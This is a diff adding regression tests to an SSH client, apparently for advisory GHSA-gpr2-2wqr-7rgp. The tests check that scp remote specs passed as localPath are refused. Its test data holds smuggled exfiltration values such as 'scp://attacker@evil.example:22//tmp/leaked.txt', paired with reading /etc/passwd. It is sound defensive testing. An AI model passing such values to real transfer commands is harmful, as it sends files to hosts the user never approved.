@@ -945,3 +945,120 @@ describe('runRemoteCommand timeout defaulting', () => {
     }
   });
 });
+
+// =============================================================================
+// GHSA-gpr2-2wqr-7rgp — scp remote-spec allowlist bypass via localPath
+//
+// scp decides "remote or local" by looking for a colon that is not preceded by
+// a path separator, so a localPath of `scp://attacker/…` or `host:/path` makes
+// it open a *second* SSH connection and copy the file to a host that was never
+// in the user's config. That bypasses _assertKnownHostAlias, the product's
+// primary trust boundary. The `--` terminator does not help: it stops option
+// parsing, not remote-spec interpretation.
+// =============================================================================
+
+describe('localPath must not be an scp remote spec', () => {
+  let client: TestClient;
+
+  beforeEach(() => {
+    client = new SSHClient() as unknown as TestClient;
+    vi.clearAllMocks();
+    readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
+    client._execFileAsync = createMockExecFileAsync();
+  });
+
+  const remoteSpecs = [
+    ['an scp:// URI', 'scp://attacker@evil.example:22//tmp/leaked.txt'],
+    ['an sftp:// URI', 'sftp://attacker@evil.example//tmp/leaked.txt'],
+    ['a bare host:path spec', 'evil.example:/tmp/leaked.txt'],
+    ['a user@host:path spec', 'attacker@evil.example:/tmp/leaked.txt'],
+    ['an IPv4 host spec', '203.0.113.10:/tmp/leaked.txt'],
+  ];
+
+  it.each(remoteSpecs)('should refuse downloadFile with %s', async (_label, localPath) => {
+    const result = await client.downloadFile('test', '/etc/passwd', localPath);
+
+    expect(result).toBe(false);
+    // The exploit is only prevented if scp is never invoked at all.
+    expect(client._execFileAsync).not.toHaveBeenCalled();
+  });
+
+  it.each(remoteSpecs)('should refuse uploadFile with %s', async (_label, localPath) => {
+    const result = await client.uploadFile('test', localPath, '/tmp/dest');
+
+    expect(result).toBe(false);
+    expect(client._execFileAsync).not.toHaveBeenCalled();
+  });
+
+  it('should refuse an empty localPath', async () => {
+    expect(await client.downloadFile('test', '/etc/passwd', '')).toBe(false);
+    expect(client._execFileAsync).not.toHaveBeenCalled();
+  });
+
+  it.each([
+    ['an absolute path', '/tmp/dest.txt'],
+    ['a relative path', 'dest.txt'],
+    ['a path containing a colon after a separator', '/tmp/weird:name.txt'],
+    ['a relative path below a directory', './out/dest:1.txt'],
+    ['a home-relative path', '~/dest.txt'],
+  ])('should still allow %s', async (_label, localPath) => {
+    const result = await client.downloadFile('test', '/etc/passwd', localPath);
+
+    expect(result).toBe(true);
+    expect(client._execFileAsync).toHaveBeenCalledWith(
+      SCP_BIN,
+      ['-o', 'StrictHostKeyChecking=accept-new', '--', 'test:/etc/passwd', localPath],
+      expect.any(Object)
+    );
+  });
+});
+
+describe('localPath validation across platforms', () => {
+  // A Windows drive letter is a local path on Windows and scp treats it as one.
+  // On POSIX the same string really is parsed as host "C" — verified against the
+  // real scp, which reports 'Could not resolve hostname c'. So the rule has to
+  // differ per platform, and both halves are pinned here rather than assumed.
+
+  async function clientOn(platform: string) {
+    const mod = await loadServerAs(platform);
+    const client = new mod.SSHClient() as unknown as TestClient;
+    mod.fs.readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
+    client._execFileAsync = createMockExecFileAsync();
+    return client;
+  }
+
+  it('should accept a Windows drive path on Windows', async () => {
+    const client = await clientOn('win32');
+    expect(await client.downloadFile('test', '/etc/passwd', 'C:\\Users\\me\\out.txt')).toBe(true);
+    expect(client._execFileAsync).toHaveBeenCalled();
+  });
+
+  it('should accept a UNC path on Windows', async () => {
+    const client = await clientOn('win32');
+    expect(await client.downloadFile('test', '/etc/passwd', '\\\\server\\share\\out.txt')).toBe(true);
+  });
+
+  it('should still refuse a remote spec on Windows', async () => {
+    const client = await clientOn('win32');
+    expect(
+      await client.downloadFile('test', '/etc/passwd', 'scp://attacker@evil.example//tmp/x')
+    ).toBe(false);
+    expect(client._execFileAsync).not.toHaveBeenCalled();
+  });
+
+  it('should refuse a Windows drive path on POSIX, where scp reads it as a host', async () => {
+    const client = await clientOn('linux');
+    expect(await client.downloadFile('test', '/etc/passwd', 'C:\\Users\\me\\out.txt')).toBe(false);
+    expect(client._execFileAsync).not.toHaveBeenCalled();
+  });
+
+  it('should treat a backslash as a separator only on Windows', async () => {
+    // "dir\file:name" — on Windows the backslash makes it a path; on POSIX the
+    // backslash is an ordinary character, so scp would see host "dir\file".
+    const onWindows = await clientOn('win32');
+    expect(await onWindows.downloadFile('test', '/etc/passwd', 'dir\\file:name.txt')).toBe(true);
+
+    const onPosix = await clientOn('linux');
+    expect(await onPosix.downloadFile('test', '/etc/passwd', 'dir\\file:name.txt')).toBe(false);
+  });
+});
